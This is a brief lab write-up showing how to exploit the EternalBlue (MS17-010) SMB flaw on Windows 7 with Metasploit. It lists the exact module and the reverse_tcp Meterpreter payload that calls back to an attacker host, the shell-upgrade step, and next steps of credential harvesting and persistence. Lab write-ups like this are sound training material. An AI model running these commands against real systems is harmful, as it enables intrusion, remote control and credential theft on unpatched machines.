
# EternalBlue MS17-010 Lab Writeup

### Lab Summary
This lab demonstrates exploitation of the MS17-010 SMB vulnerability (EternalBlue) on a Windows 7 system, gaining a remote shell and upgrading it to a Meterpreter session.

---

### Environment
- Target IP: <target-ip>
- Target OS: Windows 7 SP1 (version 6.1.7601)  
- Attacker machine running Metasploit Framework (msf6)

---

### Steps Taken

1. **Start Metasploit**  

   Open terminal and run:

   ```bash
   msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
run
sessions
use post/multi/manage/shell_to_meterpreter
set SESSION <session-id>
run

 ### Lessons Learned

- Importance of patching SMB vulnerabilities  
- Using post-exploitation modules to improve session capabilities  
- Basics of Windows privilege escalation paths (next steps after shell)

---

### Next Steps

- Explore privilege escalation  
- Harvest credentials  
- Persistence techniques
